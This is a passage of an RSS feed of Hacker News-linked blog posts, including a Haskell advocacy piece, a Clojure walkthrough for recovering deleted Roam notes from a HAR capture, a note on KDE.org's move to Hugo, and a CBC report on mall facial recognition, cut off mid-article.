Compare this to the ruby ecosystem: When working with rails you usually need to have lots of tests or otherwise you cannot confidently refactor code after things are running in production. And even then things will break. With the power of the type safety provided by Haskell, we can make refactorings whenever we want.
</p>

<p>
It‚Äôs really a blessing.
</p>

<h2>Managed Side Effects</h2>
<p>The way you deal with the file system, external APIs and user input is way different in Haskell than in other less functional programming languages. Your program consists of a main routine that handles the side effects and calls all your pure functions that do the real business logic.</p>

<p>
Systems build this way scale really well because there are less moving parts. Additionally pure functions can be easily tested and changed later on.
</p>

<p>
Most other languages encourage you to do side effects in an unrestricted way. For example when working in Java, a call to an object method might indirectly change the state of many related objects. This means you cannot easily reason about what a method calls does. In Haskell most functions are pure and thus don't trigger side effects like this. And when they do you can see this already by the function's type signature.
</p>

<p>
Haskell forces you to manage your side effects in a more careful way. You can still do IO and have mutable state, you just need to make this explicit inside the type signature. This leads to a far more robust system in overall.
</p>

<h2>Performance</h2>
<p>
Out of the box the performance of Haskell based web applications is great. It just feels faster than your typical Rails or PHP application. Thanks to it‚Äôs highly optimized runtime system it can also <a href="https://www.yesodweb.com/blog/2011/03/preliminary-warp-cross-language-benchmarks" target="_blank">handle way more requests than a nodejs application</a>.
</p>

<p>
And you get all that without ever thinking about performance at all. 
</p>

<h2>Tooling</h2>
<p>In 2020 it‚Äôs finally good. Thanks to <a href="https://github.com/haskell/haskell-language-server" target="_blank">Haskell Language Server</a> there‚Äôs now an easy way to have type information, documentation on hover and smart refactorings inside your text editor.</p>

<p>
With nix, cabal and stack we have the best tools for managing Haskell dependencies. Cabal hell is a thing of the past.
</p>

<p>
Great things are also happening to the Haskell compiler itself. <a href="https://github.com/ghc-proposals/ghc-proposals/pull/282" target="_blank">We soon can write dot expressions as you know from most other programming languages:</a> <code>project.name</code> instead of <code>name project</code>.
</p>

<h2>Hiring Haskell Developers</h2>
<p>
Haskell is a secret super power in that regard. The Haskell community consists of many very smart and talented software engineers. Haskell developers usually learn about Haskell because they care about their craft and about building high quality software products instead of learning about it to get a high paying job. Exactly the kind of people you want in your team.
</p>

<h2>2020 Haskell is Ready for Prime Time</h2>
<p>
For years there has been this trend of growing use of type safety as well as the growing use of functional programming techniques. What language could fill this space better than Haskell. Haskell has really matured in the last years and in 2020 it feels like it‚Äôs finally ready to conquer the world.
</p>

<p>
If this post made you interested, <a href="https://ihp.digitallyinduced.com/" target="_blank">check out IHP, our batteries-included haskell web framework.</a>
</p></div></div>]]>
            </description>
            <link>https://ihp.digitallyinduced.com/ShowPost?postId=14ed1d41-5ea4-4608-9c96-465443cd6e55</link>
            <guid isPermaLink="false">hacker-news-small-sites-24944673</guid>
            <pubDate>Fri, 30 Oct 2020 17:28:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Recovering Lost Roam Notes]]>
            </title>
            <description>
<![CDATA[
Score 19 | Comments 12 (<a href="https://news.ycombinator.com/item?id=24944574">thread link</a>) | @jchen42
<br/>
October 30, 2020 | https://jeffchen.dev/posts/Recovering-Lost-Roam-Notes/ | <a href="https://web.archive.org/web/*/https://jeffchen.dev/posts/Recovering-Lost-Roam-Notes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>This post dives deep into a scary data loss scenario - we'll cover identifying the data loss, investigating the root cause, and finally recovering the data.</p>
<p><strong>This bug affected Readwise users who exported their highlights (both manually &amp; automatically) to Roam on 10/27. If you are one of those users, you should contact Roam support &amp; use <a href="https://github.com/jchen1/roam-restore" target="_blank" rel="nofollow noopener noreferrer">my recovery code</a> ASAP!</strong></p>
<!-- excerpt -->
<h2>Background</h2>
<p><a href="https://roamresearch.com/" target="_blank" rel="nofollow noopener noreferrer">Roam</a> is a "note-taking tool for networked thought". It supports all sorts of cool things - what's relevant here is that it automatically creates a new page for every day, your Daily Notes. Recently, I started using <a href="https://readwise.io/" target="_blank" rel="nofollow noopener noreferrer">Readwise</a>, which ingests Kindle highlights and uses <a href="https://en.wikipedia.org/wiki/Spaced_repetition" target="_blank" rel="nofollow noopener noreferrer">spaced repetition</a> to help you remember what you read. Readwise has a Roam integration, which automatically adds Kindle highlights to Roam. Unfortunately, since Roam doesn't have a public API yet, Readwise's integration seems to be effectively using Selenium - clicking on elements and pasting highlights which is inherently flaky.</p>
<p>Yesterday, I woke up without my Daily Notes from the day before. Disaster! Fortunately, with the help of the Roam Slack group and Tristan from Readwise, I was able to isolate the cause of note deletion and even restore my lost data. Here's what happened:</p>
<h2>Roam architecture</h2>
<p>Roam uses <a href="https://github.com/tonsky/datascript" target="_blank" rel="nofollow noopener noreferrer">Datascript</a> for its client-side database. Like Datomic, Datascript stores data as a <code>datom</code>, defined as <code>[e a v tx]</code>, or <code>entity</code>, <code>attribute</code>, <code>value</code>, and <code>transaction-id</code> (incrementing integer). If you're interested in learning more, <a href="https://tonsky.me/blog/datascript-internals/" target="_blank" rel="nofollow noopener noreferrer">Datascript's author has an excellent overview</a>.</p>
<p>Importantly for us, Roam differs from other webapps in that it doesn't store all state and history in its backend. Instead, Roam's backend just stores a snapshotted Datascript database (updated ~daily as far as I can tell) and the list of transactions since that last snapshot. If we can download those two things before Roam's next snapshot, we have two breadcrumbs towards recovery: 1. We can find the transaction that deleted my Daily Notes page 2. We can also reconstruct our Datascript database, replaying transactions up until the point of deletion, and recover our Daily Notes from that!</p>
<h2>Capturing state</h2>
<p>Our first step is to store Roam's database snapshot and transaction list. Instead of REST API calls, Roam uses a Websocket connection to send these to its web client. This complicates things for us: instead of just saving API responses with <code>curl</code>, we need to download a <a href="https://en.wikipedia.org/wiki/HAR_%28file_format%29" target="_blank" rel="nofollow noopener noreferrer">HAR file</a>, which, fortunately for us, includes Websocket traffic with more recent Chrome versions. HAR files are just JSON archives stored in chronological order - it's easy to select just the Websocket traffic:</p>
<pre><code>(<span><span>defn</span></span> parse-har
  [harfile]
  (<span><span>let</span></span> [json (<span>json/parse-string</span> (<span><span>slurp</span></span> harfile) <span>true</span>)
        ws-messages (<span><span>-&gt;&gt;</span></span> json <span>:log</span> <span>:entries</span> (<span><span>filter</span></span> #(<span>some?</span> (<span>:_webSocketMessages</span> %))) second <span>:_webSocketMessages</span>)
        ws-data (<span><span>map</span></span> <span>:data</span> ws-messages)]
    ws-data))</code></pre>
<p>Inspecting this data more closely, it appears that Roam's websocket messages are generally JSON strings (and occasionally numbers). When a message is more than 16KB, it's split into multiple messages without wrapping - so we'll need to stitch these bigger messages together. One way to detect a non-split-message is to just try and parse it as JSON - if it's valid, we can say it's non-split. (There's an edge case we're unlikely to hit here: if the 16KB chunk just so happens to be valid JSON as well we'll be out of luck. Lucky for us, I didn't run into this!) Now, we can extend <code>parse-har</code> as follows:</p>
<pre><code>(<span><span>defn</span></span> parse-har
  [harfile]
  (<span><span>let</span></span> [json (<span>json/parse-string</span> (<span><span>slurp</span></span> harfile) <span>true</span>)
        ws-messages (<span><span>-&gt;&gt;</span></span> json <span>:log</span> <span>:entries</span> (<span><span>filter</span></span> #(<span>some?</span> (<span>:_webSocketMessages</span> %))) second <span>:_webSocketMessages</span>)
        ws-data (<span><span>map</span></span> <span>:data</span> ws-messages)
        try-parse #(<span><span>try</span></span> (<span>json/parse-string</span> % <span>true</span>)
                        (<span>catch</span> Throwable _ <span>nil</span>))
        
        
        
        ws-json (<span><span>reduce</span></span> (<span><span>fn</span></span> [{<span>:keys</span> [done partial]} next]
                          (<span><span>let</span></span> [potential-json-str (<span><span>str</span></span> partial next)]
                            (<span><span>if-let</span></span> [json (<span>try-parse</span> potential-json-str)]
                              {<span>:done</span> (<span><span>conj</span></span> done json)
                               <span>:partial</span> <span>""</span>}
                              {<span>:done</span> done
                               <span>:partial</span> potential-json-str})))
                        {<span>:done</span> [] <span>:partial</span> <span>""</span>}
                        ws-data)]
    (<span><span>assert</span></span> (<span><span>=</span></span> (<span>:partial</span> ws-json) <span>""</span>))
    (<span>:done</span> ws-json)))</code></pre>
<h2>Finding the culprit</h2>
<p>Armed with our parsed websocket messages, we can see that many of them look like transactions. One that looks particularly suspicious has a nested field named <code>tx-meta</code> with the value <code>delete-page</code>! The transaction looks something like this:</p>
<pre><code>{<span>:app-version</span> <span>"0.7.4"</span>,
 <span>:email</span> <span>"hello@jeff.yt"</span>,
 <span>:session-id</span> <span>"uuid95d98efd-c8fa-4412-87a4-e7b7201bee24"</span>,
 <span>:t</span> <span>1603947791561</span>,
 <span>:time</span> <span>1603947791542</span>,
 <span>:tx</span> <span>"[[\"^ \",\"~:block/uid\",\"ogCRjInhE\",\"~:block/string\",\"some-text-here\",\"~:edit/time\",1603947791363,\"~:edit/email\",\"hello@jeff.yt\"],[\"^ \",\"^0\",\"4CpSytRnt\",\"^1\",\"Highlights first synced by #Readwise October 28th, 2020\",\"^2\",1603947791364,\"^3\",\"hello@jeff.yt\"],[\"^ \",\"^0\",\"C-IOsE50G\",\"^1\",\"New highlights added October 28th, 2020 at 11:03 PM\",\"^2\",1603947791364,\"^3\",\"hello@jeff.yt\"],[\"~:db.fn/retractEntity\",[\"^0\",\"hLBqaz4gS\"]],[\"^4\",[\"^0\",\"vwD08rqdT\"]],[\"^4\",[\"^0\",\"6VWOGgeAd\"]],[\"^4\",[\"^0\",\"P56-fWN2O\"]],[\"^4\",[\"^0\",\"SffV3NfN2\"]],[\"^4\",[\"^0\",\"qnZBZCGCv\"]],[\"^4\",[\"^0\",\"10-28-2020\"]]]"</span>,
 <span>:tx-meta</span> {<span>:event-id</span> <span>"uuid719b009f-b969-47b6-b2db-41542d10b328"</span>,
           <span>:event-name</span> <span>"delete-page"</span>,
           <span>:tx-id</span> <span>"uuid289e80fc-4c27-4d54-9df4-d83ac0ceeaed"</span>,
           <span>:tx-name</span> <span>"delete-page"</span>}}</code></pre>
<p>I omitted ~90% of the transaction to save space - but it's more of the same. This definitely looks like the transaction that deleted my Daily Notes page: I see <code>db.fn/retractEntity</code> as well as <code>10-28-2020</code> in the transaction. Interestingly, this transaction captures two Readwise interactions as well. It's not a smoking gun, but it's definitely suspicious that Readwise was operating on my database at the <strong>exact same time</strong> that my page was mysteriously deleted!</p>
<p>Let's pause here, and check in with the Roam Slack group. Someone else has already started a thread about data loss! They and others quickly confirm that they also all have Readwise's auto-export enabled. Again, it's not confirmation that Readwise is to blame, but it's enough for me to stop what I'm doing and disable my Readwise integration! We'll also share our knowledge in the Slack thread and ask affected users to save their Roam HAR file like we did.</p>
<p>Later, <a href="https://twitter.com/homsiT" target="_blank" rel="nofollow noopener noreferrer">Tristan, founder of Readwise</a>, pops into Slack and quickly confirms that <a href="https://twitter.com/homsiT/status/1321856588022513665" target="_blank" rel="nofollow noopener noreferrer">a recent Roam behavior change combined with the Readwise integration can cause deleted pages</a>. Huge props to Tristan who responds perfectly: he triages the issue, disables the feature to prevent any more users from hitting it, and fixes &amp; re-enables auto-export all within a couple hours! Tristan also remains communicative and takes full responsibility, even offering refunds, though I'd argue that these hiccups are bound to happen when Roam still hasn't opened up their public API.</p>
<h2>Deserializing the database</h2>
<p>Peeking again at our parsed HAR file, we see what appears to be our serialized database - it's stored like this:</p>
<pre><code>{<span>:split-db</span> {<span>0</span> <span>"transit-encoded-str-0"</span>
            <span>1</span> <span>"transit-encoded-str-1"</span>
            ...}}</code></pre>
<p>Each string looks something like this:</p>
<pre><code>[\\\"^P\\\",[1641,\\\"^H\\\",\\\"zeciaTJfg\\\",536877373]],[\\\"^P\\\",[1641,\\\"^17\\\",\\\"hello@jeff.yt\\\",536877373]],[\\\"^P\\\",[1641,\\\"^18\\\",1583270770601,536877373]],[\\\"^P\\\",[1641,\\\"^R\\\",\\\"hello@jeff.yt\\\",536877373]],[\\\"^P\\\",[1641,\\\"^S\\\",1583270784121,536877377]],[\\\"^P\\\",[1642,\\\"^E\\\",1643,536877384]]
</code></pre>
<p>This looks like Transit! <a href="https://github.com/cognitect/transit-format" target="_blank" rel="nofollow noopener noreferrer">Transit</a> is a JSON-like format for sending data between applications (<a href="https://blog.klipse.tech/clojure/2016/09/22/transit-clojure.html" target="_blank" rel="nofollow noopener noreferrer">this post</a> is a good introduction). Datascript has its own <a href="https://github.com/tonsky/datascript-transit/" target="_blank" rel="nofollow noopener noreferrer">set of Transit handlers</a> - let's import that and see if we get a working database! Of course, we'll also need to combine <code>split-db</code> by smashing the Transit-encoded strings together.</p>
<pre><code>(<span>require</span> '[datascript.transit <span>:as</span> dt])

(<span><span>defn</span></span> parse-db
  [parsed-har]
  (<span><span>let</span></span> [db-str (<span><span>-&gt;&gt;</span></span> parsed-har
                    
                    (<span><span>filter</span></span> #(<span>some-&gt;</span> % <span>:d</span> <span>:b</span> <span>:d</span> <span>:split-db</span>))
                    first <span>:d</span> <span>:b</span> <span>:d</span> <span>:split-db</span>
                    vals
                    (<span>string/join</span> <span>""</span>))]
    (<span>dt/read-transit-str</span> db-str)))</code></pre>
<p>Voila - a real Datascript database! We can confirm it's my Roam database by querying it:</p>
<pre><code>(<span>require</span> '[datascript.core <span>:as</span> d])
(<span><span>let</span></span> [db (<span><span>-&gt;</span></span> harfile (<span>parse-har</span>) (<span>parse-db</span>))
      conn (<span>d/conn-from-db</span> db)]
  (<span>d/q</span> '[<span>:find</span> ?e <span>:where</span> [?e <span>:node/title</span> <span>"Daily Template"</span>]] @conn))

</code></pre>
<p>With a working Roam database, our next step is to apply all of the transactions we have up until the deletion event. Transactions are Transit-encoded, and we'll have to do quite a bit of data manipulation to get a list of them. Once we have that list, we can sort the transactions and apply them sequentially:</p>
<pre><code>(<span><span>defn</span></span> apply-transactions-until
  [db parsed-har until-time]
  (<span><span>let</span></span> [transactions-to-apply (<span><span>-&gt;&gt;</span></span> parsed-har
                                   (<span><span>map</span></span> #(<span>some-&gt;</span> % <span>:d</span> <span>:b</span> <span>:d</span>))
                                   (<span><span>filter</span></span> seqable?)
                                   (<span><span>apply</span></span> concat)
                                   (<span><span>filter</span></span> #(<span>string/starts-with?</span> (<span><span>-&gt;</span></span> % first name) <span>"-MK"</span>))
                                   (<span><span>map</span></span> second)
                                   (<span><span>filter</span></span> #(<span><span>&lt;</span></span> (<span>:time</span> %) until-time))
                                   (<span><span>sort-by</span></span> <span>:time</span>)
                                   (<span><span>map</span></span> <span>:tx</span>)
                                   (<span><span>map</span></span> dt/read-transit-str))
        conn (<span>d/conn-from-db</span> db)]
    (<span><span>doseq</span></span> [tx transactions-to-apply]
      (<span>d/transact!</span> conn tx))
    (<span>d/db</span> conn)))</code></pre>
<p>Here, <code>until-time</code> is the time of the deletion transaction. We're so close now! We've managed to materialize my Roam database from <strong>right before my notes were deleted</strong>! All we need to do now is pull that deleted page, and we'll be done!</p>
<h2>Recoverin‚Ä¶</h2></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jeffchen.dev/posts/Recovering-Lost-Roam-Notes/">https://jeffchen.dev/posts/Recovering-Lost-Roam-Notes/</a></em></p>]]>
            </description>
            <link>https://jeffchen.dev/posts/Recovering-Lost-Roam-Notes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24944574</guid>
            <pubDate>Fri, 30 Oct 2020 17:21:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why to Be Prolific]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24944562">thread link</a>) | @jerodsanto
<br/>
October 30, 2020 | https://www.chrismytton.com/be-prolific/ | <a href="https://web.archive.org/web/*/https://www.chrismytton.com/be-prolific/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
<p>There‚Äôs a story about an art teacher that split their class in half. They told one half of the students that they‚Äôd be graded based on a single piece of work, and the other half that they would be graded on the quantity of work produced.</p>

<p>The half that was being graded on quantity ended up producing higher quality pieces.</p>

<p>By iterating and learning from their mistakes they actually ended up producing better work than the students that only had to produce one piece.</p>

<p>Quantity leads to quality.</p>



<p>Sharing work helps you to think and develop. The feedback you get feeds into the next iteration.</p>

<p>If you‚Äôve enjoyed creating something then there‚Äôs a good chance that at least a handful of people in the world will enjoy seeing it or hearing about it.</p>

<p>Promoting yourself and your work can be a good way to clarify your thinking and future direction.</p>

<h2 id="get-better-by-creating-more">Get better by creating more</h2>

<p>Produce lots of stuff and share it.</p>

<p>Being prolific doesn‚Äôt mean that everything you produce has to be absolute gold. But the process of producing large quantities of work ultimately leads to a higher quality of work.</p>

<hr>

<p><a href="https://news.ycombinator.com/item?id=24866706" target="_blank">Discussion on Hacker News</a>.</p>

<p><a href="https://eduardoorige.com.br/posts/seja-prolifico/index.html" target="_blank">Portuguese translation</a> by Eduardo Orige.</p>

<p><a href="https://farzat.online/2020/10/28/be-prolific/" target="_blank">Arabic translation</a> by Farzat Al Chayah.</p>

    </div></div>]]>
            </description>
            <link>https://www.chrismytton.com/be-prolific/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24944562</guid>
            <pubDate>Fri, 30 Oct 2020 17:21:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Revenue Takes Care of Itself]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24944559">thread link</a>) | @yarapavan
<br/>
October 30, 2020 | https://boz.com/articles/revenue | <a href="https://web.archive.org/web/*/https://boz.com/articles/revenue">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><p>Bill Walsh is one of the greatest coaches in the history of the NFL. He
started with a 49ers team that only won two games and within two years they
had won their first Super Bowl. He retired after 10 years but before he was
done they would win two more. A decade later more than half of the head
coaches in the NFL had once served on his staff.</p>
<p>Just before he passed away he wrote a book on leadership entitled ‚Äú<a href="https://www.amazon.com/Score-Takes-Care-Itself-Philosophy/dp/1591843472/">The Score
Takes Care of
Itself</a>.‚Äù
His idea was simple enough: you don‚Äôt win football games by trying to score.
You don‚Äôt build championship teams by trying to win.  Instead he set a high
standard of performance and held people to it on the execution of every play.
He believed there were good losses and bad wins. He believed that if you had
good people, a good culture, and strong guiding principles then the score
would take care of itself.</p>
<p>If you go back to 2012 there are some analogies one could draw between the
49ers of that era and the performance of Facebook ads. I don‚Äôt know if we even
had two wins before 2012. But after? Well, they don‚Äôt give out Lombardi
trophies for digital advertising but I think if they did we‚Äôd be a contender.</p>
<p>The far more interesting connection between these stories is the approach. We
didn‚Äôt establish ourselves as a leading digital advertising platform by
focusing on the obvious metric of revenue. We realized that when it came to
revenue there were good losses and bad wins. We explicitly focused on
advertiser value and consumer value even when it came at the cost of revenue.
This wasn‚Äôt just cultural; our ranking systems and auction focus on optimizing
advertiser value and consumer experience rather than revenue to Facebook. By
focusing on our people, on our culture, and on strong guiding principles we
have been able to demonstrate that the revenue takes care of itself.</p>
<p>Focusing on metrics has <a href="https://en.wikipedia.org/wiki/Goodhart%27s_law">well established
problems</a>, but in the case of
revenue there are two even more pathological ones.</p>
<p>Revenue is a trailing indicator. When people are just getting started with a
new service they don‚Äôt just dive in with their full budget. They invest a
little and revise their budget allocation incrementally. If you push too hard
on revenue you can get 100% of the budget they allocated you today but you are
missing the bigger opportunity to give them outsized returns which is what
will cause them to allocate you more of their budget in the future.</p>
<p>Revenue is short term. In many of our products a focus on maximizing revenue
would lead us down a very different path than maximizing value. Maximizing
value often requires long term investments whose return profile is risky or
entirely unknown. But we know that without those types of long term
investments our business growth will start to plateau as we saturate the value
created by existing solutions.</p>
<p>Mark had a famous line in the S-1 we filed for our IPO: ‚ÄúWe don‚Äôt build
products to make money, we make money to build great products.‚Äù I agree
wholeheartedly which is why the mission of the Facebook ads organization isn‚Äôt
to make money. It is to make meaningful connections between people and
businesses. And we take that seriously.</p></section></div></div>]]>
            </description>
            <link>https://boz.com/articles/revenue</link>
            <guid isPermaLink="false">hacker-news-small-sites-24944559</guid>
            <pubDate>Fri, 30 Oct 2020 17:20:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[KDE.org migrated to Hugo]]>
            </title>
            <description>
<![CDATA[
Score 178 | Comments 71 (<a href="https://news.ycombinator.com/item?id=24944537">thread link</a>) | @ognarb
<br/>
October 30, 2020 | https://carlschwan.eu/2020/10/30/kde-org-hugo.html | <a href="https://web.archive.org/web/*/https://carlschwan.eu/2020/10/30/kde-org-hugo.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p><img src="https://carlschwan.eu/assets/img/heading_hugo.png" alt="Screenshot KDE.org"></p>

<p><a href="https://kde.org/">KDE.org</a> now uses <a href="https://gohugo.io/">Hugo</a>. Hugo is a fast and modern static site
generator written in Go. It provides a few improvements over the old system that was
using plain PHP. A large part of the work was done by Anuj during GSoC 2020. This
was a massive work, converting the repository storing more than 20 years of KDE
history.</p>

<p>The website is now generated once and no longer uses PHP to generate itself at runtime.
This improves the loading speed of the website, but the speed boost is not significant,
since the PHP code used before was quite small and KDE‚Äôs servers are powerful.</p>

<p>But the biggest improvement is in terms of features. We are now working with markdown
files instead of raw HTML files, this makes the life of the promo team much easier.</p>

<p>The internationalization of the website now creates a unique URL per language, this
should allow Google to link to the version of the website using the correct language.
A <a href="https://kde.org/fr/">French</a>, <a href="https://kde.org/uk/">Ukrainian</a>,
<a href="https://kde.org/ca/">Catalan</a>, <a href="https://kde.org/nl/">Dutch</a>, and a few more languages
are already available. There is also a proper language selector! We also don‚Äôt need
to manually tag each string for translations.</p>

<p>There is also now an <a href="https://kde.org/announcements/index.xml">RSS feed</a> with all the
latest announcements. Another big improvement is that the announcements list is
autogenerated and no longer modified by hand and with the help of the release scripts.</p>

<p>Another nice change for website developers is that now the SCSS code for the individual
pages is located in the kde-org repository itself instead of another repository.
Overall the developer experience is much better, there is no need to set up an apache
server and to the PHP configs to include the <a href="https://invent.kde.org/websites/capacity">capacity framework</a>, just to get the
website running locally. Now you only need to download the Hugo binary from their
release page and run it on the repo.</p>

<h2 id="hugo-and-gettext">Hugo and Gettext</h2>

<p>The internationalization of KDE.org was quite a challenge. When working on a multilingual
website with Hugo, Hugo expects a markdown document per language for each translated
page.</p>

<div><div><pre><code>plasma-desktop.md
plasma-desktop.es.md
plasma-desktop.fr.md
plasma-desktop.uk.md
...
</code></pre></div></div>

<p>The problem is that traditional translations workflow rely on a string-based approach,
where a document is split in paragraphs and translated individually. So I couldn‚Äôt
just put each file markdown file as big blobs in the po files. To solve this problem,
I created a python script splitting the markdown files in paragraphs, simplifying
the markdown syntax (removing leading <code>#</code> and <code>+</code> for heading and list item). This
script also handles Hugo shortcodes transforming:</p>

<div><div><pre><code>
{{&lt; img caption="My figure caption" alt="My accessible description" src="..." &gt;}}

</code></pre></div></div>

<p>in two strings:</p>

<ul>
  <li>My figure caption</li>
  <li>My accessible description</li>
</ul>

<p>The script can obliviously put the individual strings back in place. The scripts also
handle the menu translation, and the translations of the strings in the footers.
For now, the script is just a file in the kde-org repository, but I would like to
transform it to a standalone library so that other gettext and Hugo users can
translate their website.</p>

<p>Using Hugo API, the language selector was trivial to write:</p>

<div><div><pre><code>
&lt;ul class="navbar-nav ml-auto"&gt;
  {{ if .IsTranslated }}
    &lt;li class="nav-item dropdown" aria-describedby="language-picker-description"&gt;
      &lt;p class="sr-only" id="language-picker-description"&gt;{{ i18n "Select-your-language" }}&lt;/p&gt;
      &lt;a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false"&gt;
        &lt;img src="/Language-Icons/icon20x24px-exported-transparent.png" alt="" /&gt;
        &lt;span&gt;{{ i18n "translations" }}&lt;/span&gt;
      &lt;/a&gt;
      &lt;div class="dropdown-menu dropdonw-trans" role="listbox"&gt;
        &lt;a class="dropdown-item" aria-selected="true" hreflang="{{ .Site.Language.Lang }}" role="option" lang="{{ .Site.Language.Lang }}" href="{{ .Permalink }}"&gt;{{ .Site.Language.LanguageName }}&lt;/a&gt;
        {{ range .Translations }}
          &lt;a class="dropdown-item" hreflang="{{ .Language.Lang }}" role="option" lang="{{ .Language.Lang }}" href="{{ .Permalink }}"&gt;{{ .Language.LanguageName }}&lt;/a&gt;
        {{ end }}
      &lt;/div&gt;
    &lt;/li&gt;
  {{ end }}
&lt;/ul&gt;

</code></pre></div></div>

<p>This is a bit verbose because this selector is also fully accessible for screen readers.</p>

<p>There are a few more tricks employed in kde.org to improve the internationalization, for
example when a page doesn‚Äôt exist in a language, there is an Apache rule redirecting it
to the English version. Another nice trick is that there is a special Hugo shortcode
called <code>i18n_var</code> and used to parametrize the strings. For example:</p>

<div><div><pre><code>
{{&lt; i18n_var "Today KDE releases a bugfix update to KDE Plasma 5, versioned %[1]s" "5.20.2" &gt;}}

</code></pre></div></div>

<p>And the extractor is clever and only extract the part that needs to be translated.</p>

<p><a href="https://invent.kde.org/websites/kde-org/-/blob/master/translations.py">The script</a></p>

<p>You can comment this post on <a href="https://www.reddit.com/r/kde/comments/jl1pim/kdeorg_migrated_to_hugo/?">r/kde</a>
and <a href="https://news.ycombinator.com/item?id=24944537">HN</a>.</p>
</section></div>]]>
            </description>
            <link>https://carlschwan.eu/2020/10/30/kde-org-hugo.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24944537</guid>
            <pubDate>Fri, 30 Oct 2020 17:19:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mall real estate company collected 5M images of shoppers]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24944486">thread link</a>) | @ChrisArchitect
<br/>
October 30, 2020 | https://www.cbc.ca/news/politics/cadillac-fairview-5-million-images-1.5781735 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/politics/cadillac-fairview-5-million-images-1.5781735">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>The real estate company behind some of Canada's most popular shopping centres embedded cameras inside its digital information kiosks at 12 shopping malls in major Canadian cities&nbsp;to collect millions of images ‚Äî and used facial recognition technology without customers' knowledge or consent ‚Äî&nbsp;according to a new investigation by the federal, Alberta and B.C. privacy commissioners.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5499879.1584406507!/fileImage/httpImage/image.JPG_gen/derivatives/16x9_780/covid-19-pandemic-stores-closed.JPG"></p></div><figcaption>Cadillac Fairview, the real estate company behind some of Canada's most popular shopping centres, embedded cameras inside its digital information kiosks at 12 shopping malls across Canada, according to a new investigation.<!-- --> <!-- -->(Evan Mitsui/CBC)</figcaption></figure><p><span><p>The real estate company behind some of Canada's most popular shopping centres embedded cameras inside its digital information kiosks at 12 shopping malls in major Canadian cities&nbsp;to collect millions of images ‚Äî and used facial recognition technology without customers' knowledge or consent ‚Äî&nbsp;according to a new investigation by the federal, Alberta and B.C. privacy commissioners.</p>  <p>"Shoppers had no reason to expect their image was being collected by an inconspicuous camera, or that it would be used, with facial recognition technology, for analysis," said federal Privacy Commissioner Daniel Therrien&nbsp;in a statement.</p>  <p>"The lack of meaningful consent was particularly concerning given the sensitivity of biometric data, which is a unique and permanent characteristic of our body and a key to our identity."</p>  <p>According to the report, the technology&nbsp;Cadillac Fairview used&nbsp;‚Äî known as "anonymous video analytics" or AVA‚Äî took temporary digital images of the faces of individuals within the field of view of the camera in the directory.</p>  <p><strong><em>WATCH: Shoppers' privacy violated at major Canadian malls: Privacy commissioners:</em></strong></p>  <p><span><span><div><div role="button" tabindex="0" title="Shoppers‚Äô privacy violated at major Canadian malls: Privacy commissioners"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/949/527/mall-privacy-daigle-291020.jpg" alt=""></p></div></div></div><span>Cadillac Fairview, the real estate company behind some of Canada‚Äôs biggest malls, violated the privacy of shoppers by collecting five million images without consent from cameras inside digital information kiosks, an investigation by federal, British Columbia and Alberta privacy commissioners found.<!-- --> <!-- -->2:01</span></span></span></p>  <p>It then used facial recognition software to convert those images into biometric numerical representations of&nbsp;individual faces, about five million images&nbsp;in total.</p>  <p>That sensitive personal information could be used to identify individuals based on their unique facial features, said&nbsp;the commissioners.</p>    <p>The report said the company also kept about 16 hours of video recordings, including some audio, which it had captured during a testing phase at two malls.</p>  <p>Cadillac Fairview said it&nbsp;used AVA technology&nbsp;to assess foot traffic and track shoppers' ages and genders&nbsp;‚Äî but not to identify individuals.&nbsp;</p>  <p>The company also argued shoppers were made aware of the activity through decals it placed on shopping mall entry doors that warned cameras were being used for "safety and security" and included the web address for Cadillac Fairview's&nbsp;privacy policy.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.4762407.1533648115!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/chinook-centre-directory.jpg 300w,https://i.cbc.ca/1.4762407.1533648115!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/chinook-centre-directory.jpg 460w,https://i.cbc.ca/1.4762407.1533648115!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/chinook-centre-directory.jpg 620w,https://i.cbc.ca/1.4762407.1533648115!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/chinook-centre-directory.jpg 780w,https://i.cbc.ca/1.4762407.1533648115!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/chinook-centre-directory.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.4762407.1533648115!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/chinook-centre-directory.jpg"></p></div><figcaption>This directory in Chinook Centre mall in south Calgary uses facial recognition technology.<!-- --> <!-- -->(Sarah Rieger/CBC)</figcaption></figure></span></p>  <p>But the commissioners said that&nbsp;wasn't good enough and did not meet the standard for meaningful consent.&nbsp;</p>  <p>"An individual would not, while using a mall directory, reasonably expect their image to be captured and used to 